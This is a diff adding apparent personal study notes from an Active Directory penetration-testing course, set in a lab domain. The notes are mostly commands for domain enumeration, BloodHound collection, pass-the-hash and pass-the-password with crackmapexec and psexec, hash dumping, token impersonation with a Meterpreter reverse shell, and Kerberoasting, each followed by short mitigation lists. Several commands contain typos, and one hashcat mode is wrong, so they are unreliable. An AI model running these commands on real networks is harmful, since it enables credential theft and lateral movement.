@@ -300,7 +300,175 @@ PowerView Cheat Sheet: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed
 
 * ```(Get-DomainPolicy)."system access"
 
-* ```
+* ```Get-NetUser ```
+
+* ```Get-NetUser | select sn ```
+
+* ```Get-NetUser | select sameaccountname ```
+
+* ```Get-UserProperty ```
+
+* ```Get-UserProperty -Propeerties pwdlastset ```
+
+* ```Get-UserProperty -Propeerties logoncount ```
+
+* ```Get-UserProperty -Propeerties badpwdcount ```
+
+* ```Get-NetComputer ```
+* ```Get-NetComputer -fulldata ```
+* ```Get-NetComputer -fulldata | select OperatingSystem ```
+
+* ```Get-NetGroup -GroupName "Domain Admin" ```
+* ```Get-NetGroup -GroupName "admin" ```
+
+* ```Invoke-ShareFinder ```
+* ```Get-NetGPO ```
+
+### Bloodhound Overview and Setup
+
+* ```apt-install bloodhound ```
+
+* ```neo4j console ```
+
+* ```bloodhound ```
+
+### Grabbing Data with Invoke-Bloodhound
+
+* copy the sharphound.ps1 and run it
+
+* ```. .\sharphound.ps1 ```
+
+* ```Invoke-BloodHound -CollectMethod All -Domain Marvel.local -ZipFileName file.zip ```
+
+### Enumerating Domain Data with Bloodhound
+
+* upload the data
+
+* use prebuilt queries
+
+## Attacking Active Directory: Post-Compromise Attacks
+
+* before this , we must have some creds 
+
+### Pass the Hash / Password Overview
+
+* if we crac k a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks
+
+**crackmapexec**
+
+  ```crackmapexec <ip/CIDR> -u <user> -d <domain> -p <pass> ```
+  
+  
+### Installing crackmapexec
+
+* ```apt install crackmapexec ```
+
+### Pass the Password Attacks
+
+* ``` crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1 ```
+
+* ``` crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1 --sam ```
+
+* ```psexec.py marvel/fcastle:Password1@192.168.5.142 ```
+
+### Dumping Hashes with secretsdump.py
+
+* ```secretsdump.pymarvel/fcastle:Password1@192.168.5.141 ```
+
+* ```secretsdump.pymarvel/fcastle:Password1@192.168.5.141 ```
+
+### Cracking NTLM Hashes with Hashcat
+
+* ```hashcat -m 1000 hashes.txt rockyou.txt -O ```
+
+### Pass the Hash Attacks
+
+* ```crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 134fghj2j1423h4h1 --local ```
+
+* ```psexec.py "frank castle":@192.168.5.142 -hashes 134fghj2j1423h4h1:134fghj2j1423h4h1 ```
+
+### Pass Attack Mitigations
+
+* limit account reuse
+* utilize strong password
+* privilege Access Management (PAM)
+
+
+### Token Impersonation Overview
+
+* Temporary keys that allow you access to a system/network without having to provide credentials each time yoy can access a file. Think cookies for computers.
+
+* Two Types:
+  * **Deligate** - Created for logging into a machine or using Remote Desktop
+  * **Impersonate** - "non-interactive" suh as attaching a network drive or domain logo script
+  
+  
+### Token Impersonation with Incognito 
+
+* ```msfconsole ```
+
+* ``` use exploit/windows/smb/psexec ```
+
+* ``` set payload wndows/x64/meterpreter/reverse_tcp ```
+
+* ```load incognito ```
+
+* ```list_tokens -u ```
+
+* ```impersomate_token marvel\\administrator ```
+
+* ```shell ```
+
+* ```rev2self ```
+
+* Delegate token can be imporsenate untill the system is rebooted
+
+### Token Impersonation Mitigation
+
+* limit user/group token creation permissions
+* Account tiering 
+* Local admin restriction
+
+###  Kerberoasting Overview
+
+https://medium.com/@Shorty420/kerberoasting-9108477279cc
+
+**GOAL of  Kerberoasting** :
+ 
+  * Get TGS and decrypt server's account hash.
+
+* Step 1. Get SPNs, Dump Hash
+  ```python GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request ```
+  
+* Step 2. crack the hash 
+  ```hashcat -m 1000 hash.txt rockyou.txt ```
+  
+ ### Kerberoasting Walkthrough
+
+* ```python GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request ```
+
+* ```hashcat -m 13100 hash.txt rockyou.txt ```
+
+### Kerberoasting Mitigation
+
+* Strong Password
+* Least privilege
+
+
+### GPP / cPassword Attacks Overview
+
+Group Policy Pwnage: https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
+
+
+
+
+
+
+
+
+
+
+
 
 
 
